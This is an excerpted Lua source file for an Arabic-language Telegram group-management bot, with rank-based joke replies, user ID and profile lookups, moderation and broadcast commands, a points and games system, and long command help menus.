if text == 'انا مين' and CoSu(msg) then 
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/php14)') 
return false
end

if text == 'انا مين' and Constructor(msg) then 
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/php14)') 
return false
end

if text == 'انا مين' and BasicConstructor(msg) then 
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/php14)') 
return false
end

if text == 'انا مين' and Manager(msg) then 
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/php14)') 
return false
end

if text == 'انا مين' and Mod(msg) then 
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/php14)') 
return false
end

if text == 'انا مين' and Special(msg) then 
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/php14)') 
return false
end

if text == 'انا مين' then
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/php14)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/php14)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/php14)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/php14)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/php14)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/php14)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/php14)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/php14)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/php14)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/php14)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/php14)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بيف ..🙄💔](t.me/php14)')
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/php14)') 
return false
end
end
end
...
first_name = '  𖦹  اسمك الاول ⇎ {`'..(result.first_name_)..'`}'
else
first_name = ''
end   
if result.last_name_ then 
last_name = '  𖦹  اسمك الثاني ⇎ {`'..result.last_name_..'`}' 
else
last_name = ''
end      
...
if text == 'ايديي' then
send(msg.chat_id_, msg.id_,'  𖦹  ايديك ⇎ '..msg.sender_user_id_)
end
...
local username = ('[@'..data.username_..']' or 'لا يوجد')
local iduser = result.sender_user_id_
send(msg.chat_id_, msg.id_,'  𖦹  الايدي ⇎ ('..iduser..')\n  𖦹  المعرف ⇎ ('..username..')\n  𖦹  الرتبه ⇎ ('..rtp..')\n  𖦹  نوع الكشف ⇎ بالرد')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
end
...
if msg.can_be_deleted_ == false then 
send(msg.chat_id_,msg.id_,"  𖦹  البوت ليس ادمن \n") 
return false  
end 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
local sofi = '  𖦹  عدد الادمنيه : '..data.administrator_count_..
'\n\n  𖦹  عدد المطرودين : '..data.kicked_count_..
'\n\n  𖦹  عدد الاعضاء : '..data.member_count_..
'\n\n  𖦹  عدد رسائل الجروب : '..(msg.id_/2097152/0.5)..
'\n\n  𖦹   اسم الجروب : ['..ta.title_..']'
...
send(msg.chat_id_, msg.id_, '\n  𖦹  عذرا لا استطيع طرد ( '..Rutba(msg.sender_user_id_,msg.chat_id_)..' )')
return false
end
...
send(msg.chat_id_, msg.id_,'  𖦹  عذرا لا استطيع طرد ادمنية الجروب') 
return false  
end
if data and data.ID and data.ID == 'Ok' then
send(msg.chat_id_, msg.id_,'  𖦹  تم طردك من الجروب') 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = msg.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
return false
end
end,nil)   
else
send(msg.chat_id_, msg.id_,'  𖦹  تم تعطيل امر اطردني') 
end
end
...
send(msg.chat_id_, msg.id_,'  𖦹  المعرف غلط ') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
send(msg.chat_id_, msg.id_,'  𖦹  لا استطيع اصيح معرف قنوات') 
return false  
end
if result.type_.user_.type_.ID == "UserTypeBot" then
send(msg.chat_id_, msg.id_,'  𖦹  لا استطيع اصيح معرف بوتات') 
return false  
end
...
if result.id_ then
send(msg.chat_id_, msg.id_,'  𖦹  😾تع يعم كلم الود دا قرفني [@'..username..']') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
else
send(msg.chat_id_, msg.id_,'  𖦹  تم تعطيل امر صيح') 
end
return false
end
...
send(msg.chat_id_, msg.id_,'  𖦹  انت منشئ الجروب') 
return false
end
...
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = '  𖦹  هوا الخنزير دا اللي ضافك 😂🙂⇎ '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,'  𖦹  انت دخلت عبر الرابط يوسخ 🌝') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,'  𖦹  تم تعطيل امر  مين ضافني') 
end
end
...
Text = '  𖦹  تم تفعيل امر مين ضافني '
database:del(bot_id..'Added:Me'..msg.chat_id_)  
else
Text = '  𖦹  بالتاكيد تم تفعيل امر مين ضافني '
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n  𖦹  تم تعطيل امر مين ضافني '
else
Text = '\n  𖦹  بالتاكيد تم تعطيل امر مين ضافني '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل صيح' and Manager(msg) then   
if database:get(bot_id..'Seh:User'..msg.chat_id_) then
Text = '  𖦹  تم تفعيل امر صيح'
database:del(bot_id..'Seh:User'..msg.chat_id_)  
else
Text = '  𖦹  بالتاكيد تم تفعيل امر صيح'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n  𖦹  بالتاكيد تم تعطيل امر صيح'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل اطردني' and Manager(msg) then   
if database:get(bot_id..'Cick:Me'..msg.chat_id_) then
Text = '  𖦹  تم تفعيل امر اطردني إلى عايز يخرج يتنيل 😹'
database:del(bot_id..'Cick:Me'..msg.chat_id_)  
else
Text = '  𖦹  بالتاكيد تم تفعيل امر اطردني مخلاص كفايه تفعيل الأمر 😾'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n  𖦹  تم تعطيل امر اطردني اترزع هن بقى مفيش خروج 😹'
else
Text = '\n  𖦹  بالتاكيد تم تعطيل امر اطردني مفيش خروج يولاد الكلب 😹'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "صورتي"  then
...
if not my_ph then
send(msg.chat_id_, msg.id_,"  𖦹  الصوره معطله") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,"  𖦹  عدد صورك ~⪼ "..result.total_count_.." صوره‌‏", msg.id_, msg.id_, "md")
else
...
send(msg.chat_id_, msg.id_,' 𖦹  تم تغير الايدي ارسل ايدي لرؤيته')
end
...
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, sofi.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n    ꙰𖦹•𝐮𝐬𝐞𝐫   '..username..'\n     ꙰𖦹• 𝐦𝐬𝐠  '..Msguser..'\n     ꙰𖦹•𝐬𝐭𝐚  '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n     ꙰𖦹•𝐢𝐝 '..msg.sender_user_id_..'\n    ꙰𖦹•𝗖𝗛 @php14\n')
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'[\n    ꙰𖦹•𝐮𝐬𝐞𝐫   '..username..' ↝🇧🇷\n     ꙰𖦹•𝐦𝐬𝐠  '..Msguser..'.↝🇧🇷\n     ꙰𖦹•𝐒𝐭𝐚𝐬  '..Rutba(msg.sender_user_id_,msg.chat_id_)..' ↝🇧🇷\n     ꙰𖦹•𝐢𝐝 '..msg.sender_user_id_..' ↝🇧🇷\n    ꙰𖦹•𝗖𝗛  @php14 ↝🇧🇷\n')
else
send(msg.chat_id_, msg.id_, '\n  𖦹  الصوره ~⪼ ليس لديك صور في حسابك'..'[\n    ꙰𖦹•𝐮𝐬𝐞𝐫  '..username..'\n     ꙰𖦹•𝐦𝐬𝐠  '..Msguser..'\n     ꙰𖦹•𝐢𝐝 '..msg.sender_user_id_..'\n    ꙰𖦹•𝗖𝗛 @php14\n')
end 
end
end
else
...
if Num == 0 then 
Text = '  𖦹   ليس لديك سحكات'
else
Text = '  𖦹  عدد سحكاتك *⇎ { '..Num..' } *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "مسح سحكاتي" or text == "حذف سحكاتي" then  
send(msg.chat_id_, msg.id_,'  𖦹  تم مسح سحكاتك'  )  
database:del(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_)
end
if text == "مسح جهاتي" or text == "حذف جهاتي" then  
send(msg.chat_id_, msg.id_,'  𖦹  تم مسح جهاتك'  )  
...
if Num == 0 then 
Text = '  𖦹  لم تقم بأضافه احد'
else
Text = '  𖦹  عدد جهاتك يبشا *⇎ { '..Num..' } *'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "تنظيف المشتركين" and DevSoFi(msg) then 
...
-- vardump(data) 
DRAGONdx(msg.chat_id_, msg.id_, '  𖦹  ايدي المجموعة ⇎ ( '..msg.chat_id_..' )\n  𖦹  عدد الادمنيه ⇎ ( *'..data.administrator_count_..' )*\n  𖦹  عدد المحظورين ⇎ ( *'..data.kicked_count_..' )*\n  𖦹  عدد الاعضاء ⇎ ( *'..data.member_count_..' )*\n', 'md') 
end 
...
send(msg.chat_id_, msg.id_,"  𖦹  تم اضافة له {"..numadded..'} من الرسائل')  
end
------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_,  1, " 𖦹 | تم اضافة له {"..numadded..'} من النقود', 1 , 'md')  
end
------------------------------------------------------------
...
send(msg.chat_id_, msg.id_, '  𖦹  ارسل لي عدد الرسائل الان') 
return false
end
------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_, '  𖦹  ارسل لي عدد النقاط التي تريد اضافتها') 
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
...
send(msg.chat_id_, msg.id_,"  𖦹  تم اضافة له {"..Num..'} من النقاط')  
end
...
if Num == 0 then 
Text = '  𖦹  لم تلعب اي لعبه للحصول على نقاط'
else
Text = '  𖦹  عدد نقاطك التي ربحتها هيه *⇎ { '..Num..' } نقاط *'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
send(msg.chat_id_,msg.id_,"\n*  𖦹  لا استطيع البيع اقل من 1 *") 
return false 
end
if tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
send(msg.chat_id_,msg.id_,'  𖦹  ليس لديك نقاط في الالعاب\n  𖦹  اذا كنت تريد ربح نقاط \n  𖦹  ارسل الالعاب وابدأ اللعب ! ') 
else
local NUM_GAMES = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)
if tonumber(NUMPY) > tonumber(NUM_GAMES) then
send(msg.chat_id_,msg.id_,'\n  𖦹  ليس لديك نقاط في هذه لعبه \n  𖦹  لزيادة نقاطك في اللعبه \n  𖦹  ارسل الالعاب وابدأ اللعب !') 
return false 
end
local NUMNKO = (NUMPY * 50)
database:decrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_,NUMPY)  
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_,NUMNKO)  
send(msg.chat_id_,msg.id_,'  𖦹  تم خصم *⇎ { '..NUMPY..' }* من نقاطك \n  𖦹  وتم اضافة* ⇎ { '..(NUMPY * 50)..' } رساله الى رسالك *')
end 
return false 
end
...
send(msg.chat_id_,msg.id_,'\n  𖦹  اهلا عزيزي البوت هنا ادمن'..'\n  𖦹  وصلاحياته هي ↓ \n━━━━━━━━━━'..'\n  𖦹  تغير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n  𖦹  حذف الرسائل ↞ ❴ '..delete..' ❵'..'\n  𖦹  حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n  𖦹  دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n  𖦹  تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n  𖦹  اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end
...
send(msg.chat_id_, msg.id_,"  𖦹  تم تغير رد المطور الى ⇎ "..Teext)
end
...
send(msg.chat_id_, msg.id_, '  𖦹  تم استعادة الاوامر القديمه')
end
if text == 'تغير امر الاوامر' and DevSoFi(msg) then
send(msg.chat_id_, msg.id_, '  𖦹  الان يمكنك ارسال الكليشه الاوامر')
database:set(bot_id..'help'..msg.sender_user_id_,'true')
return false 
end
if text == 'تغير امر ⓵' and DevSoFi(msg) then
send(msg.chat_id_, msg.id_, '  𖦹  الان يمكنك ارسال الكليشه ⓵')
...
if not Mod(msg) then
send(msg.chat_id_, msg.id_,' 𖦹 هاذا الامر خاص بالادمنيه\n 𖦹 ارسل {⑩} لعرض اوامر الاعضاء')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
...
{
{text = 'مميزات 𖦹', callback_data="/change-photo"},
},
{  
...
send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•ٴ\n   𖦹 [𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝚃𝙰𝚁](t.me/php14)  𖦹  ')
end
if text == "تعطيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_, ' 𖦹  تم تعطيل الابراج')
database:set(bot_id.." sofi:brj_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_,' 𖦹  تم تفعيل الابراج')
...
send(msg.chat_id_, msg.id_, ' 𖦹  تم تعطيل حساب العمر')
...
send(msg.chat_id_, msg.id_,' 𖦹  تم تفعيل حساب العمر')
...
𖦹امسح
𖦹صلاحيه
𖦹قائمه منع المتحركات
𖦹قائمه منع الصور
𖦹قائمه منع الملصقات
𖦹مسح قائمه المنع
𖦹المحذوفين
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•
𖦹مسح  امر + الامر القديم  
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•
𖦹الاوامر المضافه ( لعرض الاوامر المضافه ) 
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•
[𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝚃𝙰𝚁](t.me/php14)
]]
keyboard = {} 
...
𖦹تغير رد العضو + اسم
𖦹تغير امر الاوامر
𖦹تغير امر م1 ~ الئ م10
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════• 
𖦹اوامر المجموعه 📢 .
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════• 
𖦹استعاده الاوامر 
𖦹تحويل كالاتي~⪼ بالرد على صوره او ملصق او صوت او بصمه بالامر ← تحويل 
𖦹صيح ~ تاك ~ المميزين : الادمنيه : المدراء : المنشئين : المنشئين الاساسين
𖦹كشف القيود
𖦹تعين الايدي
𖦹تغير الايدي
𖦹الحساب + ايدي الحساب
...
┇~ الصور + متحركه + ملصق ~
𖦹حظر ~ كتم ~ تقيد ~ طرد
𖦹المحظورين ~ المكتومين ~ المقيدين
𖦹الغاء كتم + حظر + تقيد ~ بالرد و معرف و ايدي
𖦹تقيد ~ كتم + الرقم + ساعه
𖦹تقيد ~ كتم + الرقم + يوم
𖦹تقيد ~ كتم + الرقم + دقيقه
𖦹تثبيت ~ الغاء تثبيت
𖦹الترحيب
𖦹الغاء تثبيت الكل
𖦹كشف البوتات
...
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•
𖦹تفعيل ← تعطيل 
𖦹المجموعات ← المشتركين ← الاحصائيات
𖦹رفع ← تنزيل منشئ اساسي
𖦹مسح الاساسين ← المنشئين الاساسين
𖦹مسح المنشئين ← المنشئين
𖦹اسم ~ ايدي + بوت غادر 
𖦹اذاعه 
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════• ┉ ┉
𖦹اوامر مطور الاساسي
...
𖦹قائمه العام
𖦹مسح قائمه العام
𖦹جلب نسخه الاحتياطيه
𖦹رفع نسخه الاحتياطيه
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•
𖦹اذاعه خاص
𖦹اذاعه
𖦹اذاعه بالتوجيه
...
𖦹جلب نسخه البوت
𖦹رفع نسخه البوت
𖦹ضع عدد الاعضاء + العدد
𖦹ضع كليشه المطور
𖦹تفعيل/تعطيل الاذاعه
𖦹تفعيل/تعطيل البوت الخدمي
𖦹تفعيل/تعطيل التواصل
𖦹تغير اسم البوت
𖦹اضف/مسح رد عام
𖦹الردود العامه
𖦹مسح الردود العامه
•═════•| 𝗲𝗹𝗮𝗹𝗮𝗺𝘆|•═════•
𖦹الاشتراك الاجباري
𖦹تعطيل الاشتراك الاجباري
𖦹تفعيل الاشتراك الاجباري
𖦹مسح رساله الاشتراك
𖦹تغير رساله الاشتراك
𖦹تغير الاشتراك
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•
𖦹الاحصائيات
𖦹المشتركين
𖦹المجموعات 
𖦹تفعيل/تعطيل المغادره
𖦹مسح الجروبات
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•
[𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝚃𝙰𝚁](t.me/php14)
]]
...
𖦹مصه بالرد
𖦹رزله بالرد 
𖦹شنو رئيك بهذا بالرد
𖦹شنو رئيك بهاي بالرد
𖦹تحب هذا
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•
[𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝚃𝙰𝚁](t.me/php14)
]]
...
local Teext =[[
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•
 𖦹 أنت الآن في العاب السورس 𖦹 
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•
 𖦹 اوامر الالعاب كتالي 
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•
  𖦹 تفعيل الالعاب • لتفعيل العبه ° 
  𖦹 تعطيل الالعاب • لتعطيل العبه °
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•
  𖦹 الالعاب الخاصه بسورس 
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•
  𖦹 لعبه البات ~⪼ لعبة المحيبس 
  𖦹 لعبه التخمين ~⪼ لعبة البحث
  𖦹 لعبه الاسرع ~⪼ لعبة اسرع شخص
  𖦹 لعبه السمايلات ~⪼ لعبة المطابقه 
  𖦹 لعبه المختلف ~⪼ لعبة الذكاء
  𖦹 لعبه الرياضيات ~⪼ لعبة الارقام
  𖦹 لعبه الانكليزي ~⪼ لعبة ترجمه
  𖦹 لعبه الامثله ~⪼ لعبة تصحيح 
  𖦹 لعبه العكس ~⪼ لعبة عكس الكلمات
  𖦹 لعبه الحزوره ~⪼لعبة التفكير 
  𖦹 لعبه المعاني ~⪼ العبه الشهيره 
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
local Teext =[[
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•
𖦹 بك في مميزات سورس يوسف𖦹
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•
𖦹 مميزات الخاصه بسورس 𖦹
•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•
كت تويت ⇜ تويت 
انصحني ⇜ انصحنى⇜انصح 
الصراحه ⇜ صراحه 
...
send(msg.chat_id_, msg.id_,'  𖦹  تم حذف الامر')  
else
send(msg.chat_id_, msg.id_,'  𖦹  لا يوجد امر بهاذا الاسم')  
end
...
send(msg.chat_id_, msg.id_, '  𖦹  تم تعطيل اوامر التسليه')
database:set(bot_id.."Fun_Bots:"..msg.chat_id_,"true")
end
if (text and text == "تفعيل اوامر التسليه") then 
send(msg.chat_id_, msg.id_, '   𖦹  تم تفعيل اوامر التسليه')
...
send(msg.chat_id_,0,''..t..'\n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n  𖦹  تم التعديل على الميديا\n  𖦹  الشخص الي قام بالتعديل\n  𖦹  ايدي الشخص ◂ '..result.sender_user_id_..'\n  𖦹  معرف الشخص⇎{ '..users..' }') 
end,nil)
...
if DRAGON1_Msg then    
send(msg.chat_id_, msg.id_,"  𖦹  "..DRAGON1_Msg)
